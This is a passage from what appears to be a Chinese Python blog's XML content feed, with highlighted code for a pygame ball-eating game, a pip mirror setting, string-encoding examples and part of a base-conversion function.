punctuation">.</span>y <span class="token operator">+=</span> self<span class="token punctuation">.</span>sy        <span class="token keyword">if</span> self<span class="token punctuation">.</span>x <span class="token operator">-</span> self<span class="token punctuation">.</span>radius <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token keyword">or</span> \                self<span class="token punctuation">.</span>x <span class="token operator">+</span> self<span class="token punctuation">.</span>radius <span class="token operator">&gt;=</span> screen<span class="token punctuation">.</span>get_width<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>sx <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>sx        <span class="token keyword">if</span> self<span class="token punctuation">.</span>y <span class="token operator">-</span> self<span class="token punctuation">.</span>radius <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token keyword">or</span> \                self<span class="token punctuation">.</span>y <span class="token operator">+</span> self<span class="token punctuation">.</span>radius <span class="token operator">&gt;=</span> screen<span class="token punctuation">.</span>get_height<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>sy <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>sy    <span class="token keyword">def</span> <span class="token function">eat</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> other<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""吃其他球"""</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>alive <span class="token keyword">and</span> other<span class="token punctuation">.</span>alive <span class="token keyword">and</span> self <span class="token operator">!=</span> other<span class="token punctuation">:</span>            dx<span class="token punctuation">,</span> dy <span class="token operator">=</span> self<span class="token punctuation">.</span>x <span class="token operator">-</span> other<span class="token punctuation">.</span>x<span class="token punctuation">,</span> self<span class="token punctuation">.</span>y <span class="token operator">-</span> other<span class="token punctuation">.</span>y            distance <span class="token operator">=</span> sqrt<span class="token punctuation">(</span>dx <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">+</span> dy <span class="token operator">**</span> <span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> distance <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>radius <span class="token operator">+</span> other<span class="token punctuation">.</span>radius \                    <span class="token keyword">and</span> self<span class="token punctuation">.</span>radius <span class="token operator">&gt;</span> other<span class="token punctuation">.</span>radius<span class="token punctuation">:</span>                other<span class="token punctuation">.</span>alive <span class="token operator">=</span> <span class="token boolean">False</span>                self<span class="token punctuation">.</span>radius <span class="token operator">=</span> self<span class="token punctuation">.</span>radius <span class="token operator">+</span> <span class="token builtin">int</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>radius <span class="token operator">*</span> <span class="token number">0.146</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">draw</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> screen<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""在窗口上绘制球"""</span>        pygame<span class="token punctuation">.</span>draw<span class="token punctuation">.</span>circle<span class="token punctuation">(</span>screen<span class="token punctuation">,</span> self<span class="token punctuation">.</span>color<span class="token punctuation">,</span>                           <span class="token punctuation">(</span>self<span class="token punctuation">.</span>x<span class="token punctuation">,</span> self<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>radius<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">self_destroy</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>radius <span class="token operator">&gt;=</span> <span class="token number">150</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>alive <span class="token operator">=</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 定义用来装所有球的容器</span>    balls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment"># 初始化导入的pygame中的模块</span>    pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 初始化用于显示的窗口并设置窗口尺寸</span>    screen <span class="token operator">=</span> pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">600</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># 设置当前窗口的标题</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'大球吃小球'</span><span class="token punctuation">)</span>    running <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token comment"># 开启一个事件循环处理发生的事件</span>    <span class="token keyword">while</span> running<span class="token punctuation">:</span>        <span class="token comment"># 从消息队列中获取事件并对事件进行处理</span>        <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span> <span class="token operator">==</span> pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>                running <span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token comment"># 处理鼠标事件的代码</span>            <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span> <span class="token operator">==</span> pygame<span class="token punctuation">.</span>MOUSEBUTTONDOWN <span class="token keyword">and</span> event<span class="token punctuation">.</span>button <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token comment"># 获得点击鼠标的位置</span>                x<span class="token punctuation">,</span> y <span class="token operator">=</span> event<span class="token punctuation">.</span>pos                radius <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>                sx<span class="token punctuation">,</span> sy <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> randint<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>                color <span class="token operator">=</span> Color<span class="token punctuation">.</span>random_color<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment"># 在点击鼠标的位置创建一个球(大小、速度和颜色随机)</span>                ball <span class="token operator">=</span> Ball<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> radius<span class="token punctuation">,</span> sx<span class="token punctuation">,</span> sy<span class="token punctuation">,</span> color<span class="token punctuation">)</span>                <span class="token comment"># 将球添加到列表容器中</span>                balls<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ball<span class="token punctuation">)</span>        screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># 取出容器中的球 如果没被吃掉就绘制 被吃掉了就移除</span>        <span class="token keyword">for</span> ball <span class="token keyword">in</span> balls<span class="token punctuation">:</span>            ball<span class="token punctuation">.</span>self_destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 球的体积太大就会自我销毁</span>            <span class="token keyword">if</span> ball<span class="token punctuation">.</span>alive<span class="token punctuation">:</span>                ball<span class="token punctuation">.</span>draw<span class="token punctuation">(</span>screen<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                balls<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>ball<span class="token punctuation">)</span>        pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>flip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 每隔50毫秒就改变球的位置再刷新窗口</span>        pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>delay<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> ball <span class="token keyword">in</span> balls<span class="token punctuation">:</span>            ball<span class="token punctuation">.</span>move<span class="token punctuation">(</span>screen<span class="token punctuation">)</span>            <span class="token comment"># 检查球有没有吃到其他的球</span>            <span class="token keyword">for</span> other <span class="token keyword">in</span> balls<span class="token punctuation">:</span>                ball<span class="token punctuation">.</span>eat<span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实例：</p><img src="/code/python/python-xiao-you-xi-xiao-qiu-chi-da-qiu/1.gif" class="" title="大球吃小球"><h4 id="UML"><a href="#UML" class="headerlink" title="UML"></a>UML</h4><img src="/code/python/python-xiao-you-xi-xiao-qiu-chi-da-qiu/%E5%A4%A7%E7%90%83%E5%90%83%E5%B0%8F%E7%90%83.png" class="" title="大球吃小球">]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pygame </tag>
            
            <tag> 面向对象 </tag>
            
            <tag> 小游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pip 换源</title>
      <link href="//python/pip-huan-yuan/"/>
      <url>//python/pip-huan-yuan/</url>
      
        <content type="html"><![CDATA[<p>更换中科大pip镜像</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">pip config set global.index-url https://pypi.mirrors.ustc.edu.cn/simple/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 编码</title>
      <link href="//code/python/python-bian-ma/"/>
      <url>//code/python/python-bian-ma/</url>
      
        <content type="html"><![CDATA[<p>关于python的字符编码</p><!----><h3 id="字符的编码"><a href="#字符的编码" class="headerlink" title="字符的编码"></a>字符的编码</h3><h4 id="ord"><a href="#ord" class="headerlink" title="ord()"></a>ord()</h4><p>输出字符的十进制编码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token number">65</span>In <span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"中"</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token number">20013</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="chr"><a href="#chr" class="headerlink" title="chr()"></a>chr()</h4><p>输出编码对应的字符</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">20013</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'中'</span>In <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x4e2d</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'中'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="str与bytes转换"><a href="#str与bytes转换" class="headerlink" title="str与bytes转换"></a>str与bytes转换</h3><h4 id="encode"><a href="#encode" class="headerlink" title="encode()"></a>encode()</h4><p>将字符转为对应的字节流</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">:</span> s <span class="token operator">=</span> <span class="token string">'你好'</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">:</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">b'\xe4\xbd\xa0\xe5\xa5\xbd'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="decode"><a href="#decode" class="headerlink" title="decode()"></a>decode()</h4><p>将字节流转换为对应字符</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span><span class="token punctuation">:</span> s_bytes <span class="token operator">=</span> <span class="token string">b'\xe4\xbd\xa0\xe5\xa5\xbd'</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">:</span> s_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'你好'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="len"><a href="#len" class="headerlink" title="len()"></a>len()</h4><p><code>len()</code>函数计算的是<code>str</code>的字符数，如果换成<code>bytes</code>，<code>len()</code>函数就计算字节数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">"中文"</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token number">2</span>In <span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">"中文"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017075323632896">https://www.liaoxuefeng.com/wiki/1016959663602400/1017075323632896</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 编码 </tag>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python进制转换</title>
      <link href="//code/python/python-jin-zhi-zhuan-huan/"/>
      <url>//code/python/python-jin-zhi-zhuan-huan/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># @Time       : 2020/12/12 20:58</span><span class="token comment"># @Author     : ENDZHT</span><span class="token comment"># @ProjectName: pythonExercise</span><span class="token comment"># @FileName   : intBaseConversion.py</span><span class="token comment"># @Software   : PyCharm</span><span class="token triple-quoted-string string">"""    实现任意进制转换"""</span><span class="token keyword">def</span> <span class="token function">base_convert</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> start_base<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> end_base<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    数字进制任意转换    :param num:    :param start_base: 原进制，默认为10    :param end_base: 目标进制，默认为10    :return: 转换后的进制数    """</span>    <span class="token comment"># 进制对应符号表</span>    base_map1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">:</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">:</span> <span class="token string">'B'</span><span class="token punctuation">,</span>                 <span class="token number">12</span><span class="token punctuation">:</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">:</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">:</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">:</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">:</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">:</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">:</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">:</span> <span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">:</span> <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">:</span> <span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">:</span> <span class="token string">'M'</span><span class="token punctuation">,</span>                 <span class="token number">23</span><span class="token punctuation">:</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">:</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">:</span> <span class="token string">'P'</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">:</span> <span class="token string">'Q'</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">:</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">:</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">:</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">:</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">:</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">:</span> <span class="token string">'W'</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">:</span> <span class="token string">'X'</span><span class="token punctuation">,</span>                 <span class="token number">34</span><span class="token punctuation">:</span> <span class="token string">'Y'</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">:</span> <span class="token string">'Z'</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">:</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">:</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">:</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">:</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">:</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">:</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">:</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">:</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">:</span> <span class="token string">'i'</span><span class="token punctuation">,</span>                 <span class="token number">45</span><span class="token punctuation">:</span> <span class="token string">'j'</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">:</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">:</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">:</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">:</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">:</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">:</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">:</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">:</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">:</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">:</span> <span class="token string">'t'</span><span class="token punctuation">,</span>                 <span class="token number">56</span><span class="token punctuation">:</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">:</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">:</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">:</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">:</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">:</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">:</span> <span class="token string">'@'</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">:</span> <span class="token string">'#'</span><span class="token punctuation">}</span>    base_map2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">:</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">:</span> <span class="token number">11</span><span class="token punctuation">,</span>                 <span class="token string">'C'</span><span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">:</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">:</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">:</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">:</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">:</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">:</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token string">'J'</span><span class="token punctuation">:</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token string">'K'</span><span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">:</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token string">'M'</span><span class="token punctuation">:</span> <span class="token number">22</span><span class="token punctuation">,</span>                 <span class="token string">'N'</span><span class="token punctuation">:</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">:</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">:</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token string">'Q'</span><span class="token punctuation">:</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">:</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">:</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">:</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">:</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">:</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">:</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">:</span> <span class="token number">33</span><span class="token punctuation">,</span>                 <span class="token string">'Y'</span><span class="token punctuation">:</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token string">'Z'</span><span class="token punctuation">:</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">:</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">:</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">:</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">:</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">:</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">:</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">:</span> <span class="token number">44</span><span class="token punctuation">,</span>                 <span class="token string">'j'</span><span class="token punctuation">:</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">:</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">:</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">:</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">:</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">:</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">:</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">:</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">:</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">:</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">:</span> <span class="token number">55</span><span class="token punctuation">,</span>                 <span class="token 